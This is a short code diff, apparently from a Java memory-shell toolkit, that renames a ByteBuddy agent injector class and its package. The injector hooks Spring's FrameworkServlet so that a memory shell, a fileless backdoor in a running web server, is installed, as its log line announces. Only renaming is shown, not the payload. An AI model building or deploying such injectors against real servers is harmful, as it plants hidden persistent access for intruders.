@@ -1,4 +1,4 @@
-package com.reajason.javaweb.memshell.springmvc.injector;
+package com.reajason.javaweb.memshell.springwebmvc.injector;
 
 import net.bytebuddy.agent.builder.AgentBuilder;
 import net.bytebuddy.asm.Advice;
@@ -16,7 +16,7 @@ import static net.bytebuddy.matcher.ElementMatchers.named;
  * @author ReaJason
  * @since 2024/12/28
  */
-public class SpringFrameworkServletAgentInjector implements AgentBuilder.Transformer {
+public class SpringWebMvcFrameworkServletAgentInjector implements AgentBuilder.Transformer {
 
     static Class<?> interceptorClass = null;
 
@@ -57,7 +57,7 @@ public class SpringFrameworkServletAgentInjector implements AgentBuilder.Transfo
 //                .with(AgentBuilder.Listener.StreamWriting.toSystemError().withErrorsOnly())
 //                .with(AgentBuilder.Listener.StreamWriting.toSystemOut().withTransformationsOnly())
                 .type(named("org.springframework.web.servlet.FrameworkServlet"))
-                .transform(new SpringFrameworkServletAgentInjector())
+                .transform(new SpringWebMvcFrameworkServletAgentInjector())
                 .installOn(inst);
         System.out.println("MemShell Agent is working at org.springframework.web.servlet.FrameworkServlet.service");
     }
